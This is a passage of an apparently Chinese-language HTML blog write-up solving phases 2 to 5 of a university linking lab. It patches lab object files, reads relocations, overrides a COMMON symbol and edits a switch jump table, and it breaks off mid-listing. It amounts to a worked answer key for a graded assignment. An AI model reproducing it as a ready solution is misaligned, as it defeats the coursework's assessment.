class="number">0xc</span>,%esp</span><br><span class="line">  <span class="number">81</span>:   ff <span class="number">75</span> <span class="number">0</span>c                push   <span class="number">0xc</span>(%ebp)</span><br><span class="line">  <span class="number">84</span>:   e8 fc ff ff ff          call   <span class="number">85</span> &lt;kfSvKnbh+<span class="number">0x24</span>&gt;</span><br><span class="line">  <span class="number">89</span>:   <span class="number">83</span> c4 <span class="number">10</span>                add    $<span class="number">0x10</span>,%esp</span><br><span class="line">  <span class="number">8</span>c:   eb <span class="number">01</span>                   jmp    <span class="number">8f</span> &lt;kfSvKnbh+<span class="number">0x2e</span>&gt;</span><br><span class="line">  <span class="number">8</span>e:   <span class="number">90</span>                      nop</span><br><span class="line">  <span class="number">8f</span>:   c9                      leave</span><br><span class="line">  <span class="number">90</span>:   c3                      ret</span><br><span class="line">  <span class="number">00000091</span> &lt;do_phase&gt;:</span><br><span class="line">  <span class="number">91</span>:   <span class="number">55</span>                      push   %ebp</span><br><span class="line">  <span class="number">92</span>:   <span class="number">89</span> e5                   mov    %esp,%ebp</span><br><span class="line">  <span class="number">94</span>:   <span class="number">90</span>                      nop</span><br><span class="line">  <span class="number">95</span>:   <span class="number">90</span>                      nop</span><br><span class="line">  <span class="number">96</span>:   <span class="number">90</span>                      nop</span><br><span class="line">  <span class="number">97</span>:   <span class="number">90</span>                      nop</span><br><span class="line">  <span class="number">98</span>:   <span class="number">90</span>                      nop</span><br><span class="line">  ...一堆nop</span><br><span class="line">  d5:   <span class="number">5</span>d                      pop    %ebp</span><br><span class="line">  d6:   c3                      ret</span><br><span class="line"> grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; readelf -r phase1.ogrxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; readelf -r phase2.o</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.text&#x27;</span> at offset <span class="number">0x308</span> contains <span class="number">4</span> entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">00000035</span>  <span class="number">00000</span>c02 R_386_PC32        <span class="number">00000000</span>   <span class="built_in">strlen</span></span><br><span class="line"><span class="number">0000006b</span>  <span class="number">00000501</span> R_386_32          <span class="number">00000000</span>   .rodata</span><br><span class="line"><span class="number">00000073</span>  <span class="number">00000</span>d02 R_386_PC32        <span class="number">00000000</span>   <span class="built_in">strcmp</span></span><br><span class="line"><span class="number">00000085</span>  <span class="number">00000e02</span> R_386_PC32        <span class="number">00000000</span>   <span class="built_in">puts</span></span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.text&#x27;</span> at offset <span class="number">0x354</span> contains <span class="number">2</span> entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">00000007</span>  <span class="number">00000301</span> R_386_32          <span class="number">00000000</span>   .data</span><br><span class="line"><span class="number">00000010</span>  <span class="number">00000e02</span> R_386_PC32        <span class="number">00000000</span>   <span class="built_in">puts</span></span><br></pre></td></tr></table></figure><p>do_phase里的都是nop，肯定要利用puts函数来输出，他的重定位信息只有在00000085有，所以我们可以在do_phase里布置好栈帧，然后e9 jmp相对跳转到这个puts就可以输出</p><p>先布置栈帧把</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sub esp,<span class="number">0x30</span></span><br><span class="line">mov dword ptr [ebp<span class="number">-0x10</span>],<span class="number">72</span>h</span><br><span class="line">mov dword ptr [ebp<span class="number">-0x14</span>],<span class="number">65787267</span>h</span><br><span class="line">lea eax, [ebp<span class="number">-0x18</span>]</span><br><span class="line">push eax</span><br></pre></td></tr></table></figure><p><img src="/2023/05/08/ics4-linklab/image-20230506223216046.png" alt="image-20230506223216046"></p><p>用ida patch了一下，接下来就是jmp到84</p><p>**intel手册 64-ia-32-architectures-software-developer-instruction-set-reference-manual-第2卷 **</p><p><img src="/2023/05/08/ics4-linklab/image-20230506221626593.png" alt="image-20230506221626593"></p><blockquote><p>为什么没有选择 相对地址的e8 call是因为如果是e8 call过去会把返回地址先push栈里，会把call puts的参数给破环掉</p><p><img src="/2023/05/08/ics4-linklab/image-20230506213529559.png" alt="image-20230506213529559"></p></blockquote><p>我们只能自己做重定位，call指令布置在a9处，占5个字节(一字节的操作码，四字节的偏移)，下一条指令在ae处，所以偏移为84-ae即FFFF FFD6</p><p>所以字节码为e9 d6 ff ff ff，用010改下</p><p><img src="/2023/05/08/ics4-linklab/image-20230506223052595.png" alt="image-20230506223052595"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000091</span> &lt;do_phase&gt;:</span><br><span class="line">  <span class="number">91</span>:   <span class="number">55</span>                      push   %ebp</span><br><span class="line">  <span class="number">92</span>:   <span class="number">89</span> e5                   mov    %esp,%ebp</span><br><span class="line">  <span class="number">94</span>:   <span class="number">83</span> ec <span class="number">30</span>                sub    $<span class="number">0x30</span>,%esp</span><br><span class="line">  <span class="number">97</span>:   c7 <span class="number">45</span> f0 <span class="number">72</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   $<span class="number">0x72</span>,<span class="number">-0x10</span>(%ebp)</span><br><span class="line">  <span class="number">9</span>e:   c7 <span class="number">45</span> ec <span class="number">67</span> <span class="number">72</span> <span class="number">78</span> <span class="number">65</span>    movl   $<span class="number">0x65787267</span>,<span class="number">-0x14</span>(%ebp)</span><br><span class="line">  a5:   <span class="number">8</span>d <span class="number">45</span> ec                lea    <span class="number">-0x14</span>(%ebp),%eax</span><br><span class="line">  a8:   <span class="number">50</span>                      push   %eax</span><br><span class="line">  a9:   e9 d6 ff ff ff          jmp    <span class="number">84</span> &lt;kfSvKnbh+<span class="number">0x23</span>&gt;</span><br></pre></td></tr></table></figure><p>kfSvKnbh里的 leave ret会帮我们平栈后返回到main里调用do_phase的下一条指令处</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie -o linkbomb main.o phase2.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">grxer</span><br></pre></td></tr></table></figure><h2 id="phase3"><a href="#phase3" class="headerlink" title="phase3"></a>phase3</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -m32 -no-pie -o linkbomb main.o phase3.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br></pre></td></tr></table></figure><p>什么也没输出</p><p>看下汇编</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">080491c6 &lt;do_phase&gt;:</span><br><span class="line"> 80491c6:       55                      push   %ebp</span><br><span class="line"> 80491c7:       89 e5                   mov    %esp,%ebp</span><br><span class="line"> 80491c9:       83 ec 18                sub    $0x18,%esp</span><br><span class="line"> 80491cc:       c7 45 ea 79 7a 67 69    movl   $0x69677a79,-0x16(%ebp);从这里开始就是一种到 80491da都是在赋值给ebp-0x16处的局部变量cookie</span><br><span class="line"> 80491d3:       c7 45 ee 75 68 6e 62    movl   $0x626e6875,-0x12(%ebp)</span><br><span class="line"> 80491da:       66 c7 45 f2 65 00       movw   $0x65,-0xe(%ebp);赋值cookie结束</span><br><span class="line"> 80491e0:       c7 45 f4 00 00 00 00    movl   $0x0,-0xc(%ebp) ;ebp-c这个地方存的就是计数器</span><br><span class="line"> 80491e7:       eb 28                   jmp    8049211 &lt;do_phase+0x4b&gt;</span><br><span class="line"> </span><br><span class="line"> 80491e9:       8d 55 ea                lea    -0x16(%ebp),%edx</span><br><span class="line"> 80491ec:       8b 45 f4                mov    -0xc(%ebp),%eax</span><br><span class="line"> 80491ef:       01 d0                   add    %edx,%eax</span><br><span class="line"> 80491f1:       0f b6 00                movzbl (%eax),%eax;拿出cookie[计数器]里的值</span><br><span class="line"> 80491f4:       0f b6 c0                movzbl %al,%eax</span><br><span class="line"> 80491f7:       0f b6 80 60 c0 04 08    movzbl 0x804c060(%eax),%eax;0x804c060处是一个叫做NQqPQyqUth的变量符号，所以eax就是NQqPQyqUth+cookie[计数器]地址里的值</span><br><span class="line"> 80491fe:       0f be c0                movsbl %al,%eax</span><br><span class="line"> 8049201:       83 ec 0c                sub    $0xc,%esp</span><br><span class="line"> 8049204:       50                      push   %eax</span><br><span class="line"> 8049205:       e8 56 fe ff ff          call   8049060 &lt;putchar@plt&gt;</span><br><span class="line"> 804920a:       83 c4 10                add    $0x10,%esp</span><br><span class="line"> 804920d:       83 45 f4 01             addl   $0x1,-0xc(%ebp);计数器加1</span><br><span class="line"> </span><br><span class="line"> 8049211:       8b 45 f4                mov    -0xc(%ebp),%eax</span><br><span class="line"> 8049214:       83 f8 08                cmp    $0x8,%eax;计数器大于8之后就输出换行结束了</span><br><span class="line"> 8049217:       76 d0                   jbe    80491e9 &lt;do_phase+0x23&gt;</span><br><span class="line"> 8049219:       83 ec 0c                sub    $0xc,%esp</span><br><span class="line"> 804921c:       6a 0a                   push   $0xa ;最后输出一个换行</span><br><span class="line"> 804921e:       e8 3d fe ff ff          call   8049060 &lt;putchar@plt&gt;</span><br><span class="line"> 8049223:       83 c4 10                add    $0x10,%esp</span><br><span class="line"> 8049226:       90                      nop</span><br><span class="line"> 8049227:       c9                      leave</span><br><span class="line"> 8049228:       c3                      ret</span><br></pre></td></tr></table></figure><p>看一下符号表</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; readelf -s phase3.o</span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.symtab&#x27; contains 14 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 00000000     0 FILE    LOCAL  DEFAULT  ABS phase3.c</span><br><span class="line">     2: 00000000     0 SECTION LOCAL  DEFAULT    1 .text</span><br><span class="line">     3: 00000000     0 SECTION LOCAL  DEFAULT    3 .data</span><br><span class="line">     4: 00000000     0 SECTION LOCAL  DEFAULT    5 .bss</span><br><span class="line">     5: 00000000     0 SECTION LOCAL  DEFAULT    6 .rodata</span><br><span class="line">     6: 00000000     0 SECTION LOCAL  DEFAULT    8 .note.GNU-stack</span><br><span class="line">     7: 00000000     0 SECTION LOCAL  DEFAULT    9 .eh_frame</span><br><span class="line">     8: 00000000     0 SECTION LOCAL  DEFAULT    7 .comment</span><br><span class="line">     9: 00000000     4 OBJECT  GLOBAL DEFAULT    3 phase_id</span><br><span class="line">    10: 00000020   256 OBJECT  GLOBAL DEFAULT  COM NQqPQyqUth</span><br><span class="line">    11: 00000000    99 FUNC    GLOBAL DEFAULT    1 do_phase</span><br><span class="line">    12: 00000000     0 NOTYPE  GLOBAL DEFAULT  UND putchar</span><br><span class="line">    13: 00000004     4 OBJECT  GLOBAL DEFAULT    3 phase</span><br></pre></td></tr></table></figure><p>经过上面的分析，逆向为c代码大致就是</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> NQqPQyqUth[<span class="number">256</span>];</span><br><span class="line">do_phase&#123;</span><br><span class="line">    <span class="type">char</span> cookie[<span class="number">10</span>]=&#123; <span class="number">79</span> <span class="number">7</span>a <span class="number">67</span> <span class="number">69</span>  <span class="number">75</span> <span class="number">68</span> <span class="number">6</span>e <span class="number">62</span>  <span class="number">65</span> <span class="number">00</span>&#125;;<span class="comment">//懒得加逗号了</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">9</span> ; i++)</span><br><span class="line">        <span class="built_in">putchar</span>(NQqPQyqUth[cookie[i]]);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>NQqPQyqUth在COMMon块，数据都为0，所以没有输出，由于属于是弱符号，链接时会被强符号给挤掉， <a href="https://grxer.github.io/2023/04/28/static-link/">https://grxer.github.io/2023/04/28/static-link/</a> 里有分析过</p><p>所以我们定义一个强符号NQqPQyqUth，并按照cookie赋值就可以输出了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//phase3_patch.c</span></span><br><span class="line"><span class="type">char</span> NQqPQyqUth[<span class="number">256</span>]=<span class="string">&quot;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x0e00000000000r000gr&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie  -c phase3_patch.c</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie -o linkbomb main.o phase3.o phase3_patch.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">grxer0000</span><br></pre></td></tr></table></figure><h2 id="phase4"><a href="#phase4" class="headerlink" title="phase4"></a>phase4</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie -o linkbomb main.o phase4.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">B9[wL:Nec</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000029 &lt;do_phase&gt;:</span><br><span class="line">  29:   55                      push   %ebp</span><br><span class="line">  2a:   89 e5                   mov    %esp,%ebp</span><br><span class="line">  2c:   83 ec 28                sub    $0x28,%esp</span><br><span class="line">  2f:   c7 45 e6 53 4e 58 47    movl   $0x47584e53,-0x1a(%ebp)</span><br><span class="line">  36:   c7 45 ea 4a 54 43 46    movl   $0x4643544a,-0x16(%ebp)</span><br><span class="line">  3d:   66 c7 45 ee 50 00       movw   $0x50,-0x12(%ebp);从ebp-0x1a处开始的cookie赋值结束</span><br><span class="line">  43:   c7 45 f0 00 00 00 00    movl   $0x0,-0x10(%ebp);ebp-0x10处计数器置零</span><br><span class="line">  4a:   e9 e0 00 00 00          jmp    12f &lt;do_phase+0x106&gt;</span><br><span class="line">  </span><br><span class="line">  4f:   8d 55 e6                lea    -0x1a(%ebp),%edx</span><br><span class="line">  52:   8b 45 f0                mov    -0x10(%ebp),%eax</span><br><span class="line">  55:   01 d0                   add    %edx,%eax</span><br><span class="line">  57:   0f b6 00                movzbl (%eax),%eax;eax=cookie[计数器]</span><br><span class="line">  5a:   88 45 f7                mov    %al,-0x9(%ebp)</span><br><span class="line">  5d:   0f be 45 f7             movsbl -0x9(%ebp),%eax</span><br><span class="line">  61:   83 e8 41                sub    $0x41,%eax;cookie[计数器]-0x41 相当于我们的case值</span><br><span class="line">  64:   83 f8 19                cmp    $0x19,%eax;cookie[计数器]-0x41和19比较</span><br><span class="line">  67:   0f 87 b0 00 00 00       ja     11d &lt;do_phase+0xf4&gt;;大于跳转类似于我们switch的default</span><br><span class="line">  6d:   8b 04 85 04 00 00 00    mov    0x4(,%eax,4),%eax;从下面的重定位信息来看，这里有一个需要重定位的地址.rodata，eax=*(eax*4+.rodata+4)</span><br><span class="line">  74:   ff e0                   jmp    *%eax;switch的跳转，这里和我平时见的switch都不太一样，就去实验了一下，发现当case情况过多时，就会采用这种jmp *eax的跳转方式,会有一张跳转表</span><br><span class="line">  76:   c6 45 f7 38             movb   $0x38,-0x9(%ebp)</span><br><span class="line">  7a:   e9 9e 00 00 00          jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  7f:   c6 45 f7 65             movb   $0x65,-0x9(%ebp)</span><br><span class="line">  83:   e9 95 00 00 00          jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  88:   c6 45 f7 35             movb   $0x35,-0x9(%ebp)</span><br><span class="line">  8c:   e9 8c 00 00 00          jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  91:   c6 45 f7 39             movb   $0x39,-0x9(%ebp)</span><br><span class="line">  95:   e9 83 00 00 00          jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  9a:   c6 45 f7 6d             movb   $0x6d,-0x9(%ebp)</span><br><span class="line">  9e:   eb 7d                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  a0:   c6 45 f7 6d             movb   $0x6d,-0x9(%ebp)</span><br><span class="line">  a4:   eb 77                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  a6:   c6 45 f7 4c             movb   $0x4c,-0x9(%ebp)</span><br><span class="line">  aa:   eb 71                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  ac:   c6 45 f7 73             movb   $0x73,-0x9(%ebp)</span><br><span class="line">  b0:   eb 6b                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  b2:   c6 45 f7 45             movb   $0x45,-0x9(%ebp)</span><br><span class="line">  b6:   eb 65                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  b8:   c6 45 f7 37             movb   $0x37,-0x9(%ebp)</span><br><span class="line">  bc:   eb 5f                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  be:   c6 45 f7 42             movb   $0x42,-0x9(%ebp)</span><br><span class="line">  c2:   eb 59                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  c4:   c6 45 f7 77             movb   $0x77,-0x9(%ebp)</span><br><span class="line">  c8:   eb 53                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  ca:   c6 45 f7 36             movb   $0x36,-0x9(%ebp)</span><br><span class="line">  ce:   eb 4d                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  d0:   c6 45 f7 3a             movb   $0x3a,-0x9(%ebp)</span><br><span class="line">  d4:   eb 47                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  d6:   c6 45 f7 5b             movb   $0x5b,-0x9(%ebp)</span><br><span class="line">  da:   eb 41                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  dc:   c6 45 f7 63             movb   $0x63,-0x9(%ebp)</span><br><span class="line">  e0:   eb 3b                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  e2:   c6 45 f7 5b             movb   $0x5b,-0x9(%ebp)</span><br><span class="line">  e6:   eb 35                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  e8:   c6 45 f7 33             movb   $0x33,-0x9(%ebp)</span><br><span class="line">  ec:   eb 2f                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  ee:   c6 45 f7 55             movb   $0x55,-0x9(%ebp)</span><br><span class="line">  f2:   eb 29                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  f4:   c6 45 f7 77             movb   $0x77,-0x9(%ebp)</span><br><span class="line">  f8:   eb 23                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  fa:   c6 45 f7 32             movb   $0x32,-0x9(%ebp)</span><br><span class="line">  fe:   eb 1d                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line"> 100:   c6 45 f7 4e             movb   $0x4e,-0x9(%ebp)</span><br><span class="line"> 104:   eb 17                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line"> 106:   c6 45 f7 30             movb   $0x30,-0x9(%ebp)</span><br><span class="line"> 10a:   eb 11                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line"> 10c:   c6 45 f7 31             movb   $0x31,-0x9(%ebp)</span><br><span class="line"> 110:   eb 0b                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line"> 112:   c6 45 f7 34             movb   $0x34,-0x9(%ebp)</span><br><span class="line"> 116:   eb 05                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line"> 118:   c6 45 f7 67             movb   $0x67,-0x9(%ebp)</span><br><span class="line"> 11c:   90                      nop</span><br><span class="line"> </span><br><span class="line"> 11d:   8d 55 dc                lea    -0x24(%ebp),%edx</span><br><span class="line"> 120:   8b 45 f0                mov    -0x10(%ebp),%eax</span><br><span class="line"> 123:   01 c2                   add    %eax,%edx;edx=ebp-0x24+计数器</span><br><span class="line"> 125:   0f b6 45 f7             movzbl -0x9(%ebp),%eax</span><br><span class="line"> 129:   88 02                   mov    %al,(%edx);*(ebp-0x24+计数器)=*(ebp-9）</span><br><span class="line"> 12b:   83 45 f0 01             addl   $0x1,-0x10(%ebp);计数器+1</span><br><span class="line"> </span><br><span class="line"> 12f:   8b 45 f0                mov    -0x10(%ebp),%eax</span><br><span class="line"> 132:   83 f8 08                cmp    $0x8,%eax</span><br><span class="line"> 135:   0f 86 14 ff ff ff       jbe    4f &lt;do_phase+0x26&gt;;计数器&gt;9直接结束</span><br><span class="line"> </span><br><span class="line"> 13b:   8d 55 dc                lea    -0x24(%ebp),%edx</span><br><span class="line"> 13e:   8b 45 f0                mov    -0x10(%ebp),%eax</span><br><span class="line"> 141:   01 d0                   add    %edx,%eax</span><br><span class="line"> 143:   c6 00 00                movb   $0x0,(%eax)</span><br><span class="line"> 146:   83 ec 0c                sub    $0xc,%esp</span><br><span class="line"> 149:   8d 45 dc                lea    -0x24(%ebp),%eax </span><br><span class="line"> 14c:   50                      push   %eax;ebp-0x24做puts参数</span><br><span class="line"> 14d:   e8 fc ff ff ff          call   14e &lt;do_phase+0x125&gt;;puts函数</span><br><span class="line"> 152:   83 c4 10                add    $0x10,%esp</span><br><span class="line"> 155:   90                      nop</span><br><span class="line"> 156:   c9                      leave</span><br><span class="line"> 157:   c3                      ret</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; readelf -r phase4.o</span><br><span class="line"></span><br><span class="line">Relocation section &#x27;.rel.text&#x27; at offset 0x3e0 contains 2 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">00000070  00000701 R_386_32          00000000   .rodata</span><br><span class="line">0000014e  00000d02 R_386_PC32        00000000   puts</span><br><span class="line"></span><br><span class="line">Relocation section &#x27;.rel.data&#x27; at offset 0x3f0 contains 2 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">00000030  00000701 R_386_32          00000000   .rodata</span><br><span class="line">00000034  00000c01 R_386_32          00000029   do_phase</span><br><span class="line"></span><br><span class="line">Relocation section &#x27;.rel.rodata&#x27; at offset 0x400 contains 26 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">00000004  00000201 R_386_32          00000000   .text</span><br><span class="line">00000008  00000201 R_386_32          00000000   .text</span><br><span class="line">0000000c  00000201 R_386_32          00000000   .text</span><br><span class="line">00000010  00000201 R_386_32          00000000   .text</span><br><span class="line">00000014  00000201 R_386_32          00000000   .text</span><br><span class="line">00000018  00000201 R_386_32          00000000   .text</span><br><span class="line">0000001c  00000201 R_386_32          00000000   .text</span><br><span class="line">00000020  00000201 R_386_32          00000000   .text</span><br><span class="line">00000024  00000201 R_386_32          00000000   .text</span><br><span class="line">00000028  00000201 R_386_32          00000000   .text</span><br><span class="line">0000002c  00000201 R_386_32          00000000   .text</span><br><span class="line">00000030  00000201 R_386_32          00000000   .text</span><br><span class="line">00000034  00000201 R_386_32          00000000   .text</span><br><span class="line">00000038  00000201 R_386_32          00000000   .text</span><br><span class="line">0000003c  00000201 R_386_32          00000000   .text</span><br><span class="line">00000040  00000201 R_386_32          00000000   .text</span><br><span class="line">00000044  00000201 R_386_32          00000000   .text</span><br><span class="line">00000048  00000201 R_386_32          00000000   .text</span><br><span class="line">0000004c  00000201 R_386_32          00000000   .text</span><br><span class="line">00000050  00000201 R_386_32          00000000   .text</span><br><span class="line">00000054  00000201 R_386_32          00000000   .text</span><br><span class="line">00000058  00000201 R_386_32          00000000   .text</span><br><span class="line">0000005c  00000201 R_386_32          00000000   .text</span><br><span class="line">00000060  00000201 R_386_32          00000000   .text</span><br><span class="line">00000064  00000201 R_386_32          00000000   .text</span><br><span class="line">00000068  00000201 R_386_32          00000000   .text</span><br></pre></td></tr></table></figure><p>分析过后逆出大致c代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">do_phase&#123;</span><br><span class="line">    <span class="type">char</span> cookie[<span class="number">10</span>]=&#123; <span class="number">53</span> <span class="number">4</span>e <span class="number">58</span> <span class="number">47</span>  <span class="number">4</span>a <span class="number">54</span> <span class="number">43</span> <span class="number">46</span>  <span class="number">50</span> <span class="number">00</span>&#125;;</span><br><span class="line">    <span class="type">char</span> answer[<span class="number">10</span>];</span><br><span class="line">    <span class="type">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">switch</span> （tmp=cookie[i]<span class="number">-0x41</span>）&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                tmp=xxx;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            .....</span><br><span class="line">            <span class="keyword">case</span> <span class="number">26</span>:</span><br><span class="line">                tmp=xxx;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">              <span class="keyword">break</span>;  </span><br><span class="line">        &#125;</span><br><span class="line">        answer[i]=tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    answer[<span class="number">10</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(answer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多个swith会在.rodata里生成一张跳转表，跳转表在链接时需要重定位，.rel.rodata里有大量的重定位信息，都是绝对寻址修正，offset表示要修正的位置距离.rel.rodata的值，Sym. Name表示要把修正位置加上.text符号的地址，重定位是在符号表里的地址确定后进行的， <a href="https://grxer.github.io/2023/04/28/static-link/">https://grxer.github.io/2023/04/28/static-link/</a> 里分析过</p><p>比如说我们的cookie第一个为53，0x53-0x41&#x3D;0x12，</p><p>根据<code>  6d:   8b 04 85 04 00 00 00    mov    0x4(,%eax,4),%eax;</code>在.rodata的偏移为0x12*4+4&#x3D;0x4c</p><p><img src="/2023/05/08/ics4-linklab/image-20230507173942701.png" alt="image-20230507173942701"></p><p>jmp *%eax所以跳转到0be，即<code> be:   c6 45 f7 42             movb   $0x42,-0x9(%ebp)</code></p><p><img src="/2023/05/08/ics4-linklab/image-20230507174043686.png" alt="image-20230507174043686"></p><p>所以第一个输出了B，我们只需要把跳转表里得值根据cookie跳转到把对应数字送入ebp-9处即可</p><p>我把它都改为6吧哈</p><p><img src="/2023/05/08/ics4-linklab/image-20230507174600892.png" alt="image-20230507174600892"></p><p>懒得查第几个，所以都改了。。。。。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie -o linkbomb main.o phase4.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line"><span class="number">666666666</span></span><br></pre></td></tr></table></figure><h2 id="phase5"><a href="#phase5" class="headerlink" title="phase5"></a>phase5</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie -o linkbomb main.o phase5.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">fish: Job <span class="number">1</span>, <span class="string">&#x27;./linkbomb&#x27;</span> terminated by signal <span class="title function_">SIGILL</span> <span class="params">(Illegal instruction)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; readelf -r phase5.o</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.text&#x27;</span> at offset <span class="number">0x7f8</span> contains <span class="number">23</span> entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">00000066</span>  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000075</span>  <span class="number">00000501</span> R_386_32          <span class="number">00000000</span>   .rodata</span><br><span class="line"><span class="number">00000086</span>  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">000000b</span>d  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">000000</span>cc  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">000000f</span>9  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">00000107</span>  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000118</span>  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">00000138</span>  <span class="number">00001302</span> 